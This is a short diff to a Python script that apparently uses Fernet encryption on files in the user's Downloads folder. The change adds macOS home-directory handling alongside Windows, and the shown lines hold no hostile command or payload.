@@ -1,3 +1,4 @@
+import platform
 import os
 from cryptography.fernet import Fernet
 from pathlib import Path
@@ -5,7 +6,11 @@ from tkinter import messagebox
 import time
 
 
-user_path = os.environ[ "USERPROFILE" ]
+if platform.system( ).lower( ) == "windows":
+    user_path = os.environ[ "USERPROFILE" ]
+elif platform.system( ).lower( ) == "darwin":
+    user_path = os.environ[ "HOME" ]
+
 default_folder = Path( user_path, "Downloads" )
 storage_folder = Path( user_path, "Desktop/carkass" )
 storage_file = Path( storage_folder, "saccarst.txt" )
